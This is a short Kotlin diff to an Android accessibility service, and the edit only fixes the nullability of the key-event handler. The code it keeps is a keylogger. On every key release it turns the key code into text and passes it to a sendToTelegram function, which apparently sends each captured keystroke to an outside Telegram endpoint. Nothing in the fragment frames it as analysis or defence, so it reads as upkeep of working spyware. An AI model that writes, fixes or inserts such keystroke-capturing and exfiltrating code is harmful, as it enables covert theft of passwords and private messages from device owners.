@@ -36,8 +36,8 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    override fun onKeyEvent(event: KeyEvent?): Boolean {
-        if (event?.action == KeyEvent.ACTION_UP) {
+    override fun onKeyEvent(event: KeyEvent): Boolean {
+        if (event.action == KeyEvent.ACTION_UP) {
             val keyString = KeyEvent.keyCodeToString(event.keyCode)
             val message = "KEY_EVENT: $keyString"
             sendToTelegram(message)
